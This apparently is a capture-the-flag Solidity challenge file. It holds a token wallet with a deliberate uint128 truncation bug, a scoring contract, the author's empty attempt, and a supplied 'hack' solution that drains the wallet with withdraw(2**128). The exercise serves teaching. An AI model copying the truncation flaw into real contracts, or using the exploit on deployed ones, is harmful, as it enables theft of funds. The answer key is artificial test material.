// 你身无分文，尝试去盗取wallet里的CBI吧！

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract ERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) public _balances;

    mapping(address => mapping(address => uint256)) public _allowances;

    string public _name;
    string public _symbol;
    uint8 public _decimals;

    constructor(string memory name, string memory symbol) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(amount)
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _balances[account] = _balances[account].add(amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }
}

contract Cuit is ERC20("CUIT TOKEN", "CUIT"){
    constructor() public {
        _mint(msg.sender, 1000000000000000000000 * 10**18);
    }

}

contract Wallet {
    Cuit token;
    address public toen_address;
    mapping(address => uint128) balance;

    constructor() public{
        token = new Cuit();
        toen_address = address(token);
    }

    function deposit(uint _amount) public{
        require(token.transferFrom(msg.sender, address(this), _amount));
        balance[msg.sender] += uint128(_amount);
    }

    function withdraw(uint _amount) public {
        require(_amount > 0, "Amount must be > 0");
        require(uint128(_amount) <= balance[msg.sender], "Sorry, your credit is running low");
        token.transfer(msg.sender, _amount);
        balance[msg.sender] -= uint128(_amount);
    }

}

contract Check {
    Wallet public wallet;
    Cuit public cuit;
    uint public score;
    constructor() public {
        wallet = new Wallet();
        cuit = Cuit(wallet.toen_address());
    }

    function isCompleted() public {
        if(cuit.balanceOf(address(wallet)) < 1000000000000000000000 * 10 ** 18){
            score = 50;
        }

        if(cuit.balanceOf(msg.sender) > 10000 * 10 **18){
            score += 50;
        }

    }
}

// 我的答案
contract att{
    Check che;
    constructor(address addr) public {
        che = Check(addr);
    }
    function attract() public {
        
    }
}




//给的答案
contract hack {
    Check che;
    constructor(Check _che) public {
        che = _che;
    }

    function pwn(uint256 amount) public returns(uint128){
        che.wallet().withdraw(2**128);
        che.isCompleted();
    }
}